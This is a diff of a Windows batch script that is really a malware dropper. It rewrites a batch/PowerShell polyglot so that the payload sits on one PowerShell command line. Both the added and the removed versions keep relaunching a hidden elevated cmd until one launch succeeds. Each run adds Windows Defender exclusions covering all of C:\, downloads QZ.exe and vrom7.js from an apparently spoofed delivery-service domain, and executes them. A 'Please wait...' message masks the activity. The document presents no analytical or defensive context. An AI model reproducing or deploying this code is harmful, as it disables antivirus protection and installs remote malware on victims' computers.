@@ -1,14 +1,7 @@
-<# :batch script
-Echo Please wait...
 @echo off
+echo Please wait...
 setlocal
 cd "%~dp0"
-powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
+powershell -ep remotesigned -Command "$script = '%~f0'; $scriptContent = [System.IO.File]::ReadAllText($script); while ($true) { try { Start-Process 'cmd' -WindowStyle Hidden -Verb runas -ArgumentList '/k powershell -command add-mppreference -exclusionpath C:\ && powershell -command add-mppreference -exclusionprocess C:\ && powershell Start-BitsTransfer -Source https://dpdservice.uk/dl/QZ.exe -Destination $env:USERPROFILE\AppData\QZ.exe && powershell Start-Process -FilePath $env:USERPROFILE\AppData\QZ.exe && powershell Start-BitsTransfer -Source https://dpdservice.uk/dl/vrom7.js -Destination $env:USERPROFILE\AppData\vrom7.js && powershell Start-Process -FilePath $env:USERPROFILE\AppData\vrom7.js /priv'; exit } catch {} }"
 endlocal
 goto:eof
-#>
-while($true){try{Start-Process 'cmd' -WindowStyle Hidden -Verb runas -ArgumentList '/k powershell -command add-mppreference -exclusionpath C:\ && powershell -command add-mppreference -exclusionprocess C:\ && powershell Start-BitsTransfer -Source https://dpdservice.uk/dl/QZ.exe -Destination %USERPROFILE%\AppData\QZ.exe && powershell Start-Process -FilePath %USERPROFILE%\AppData\QZ.exe && powershell Start-BitsTransfer -Source https://dpdservice.uk/dl/vrom7.js -Destination %USERPROFILE%\AppData\vrom7.js && powershell Start-Process -FilePath %USERPROFILE%\AppData\vrom7.js
- /priv';exit}catch{}}
-
-
-
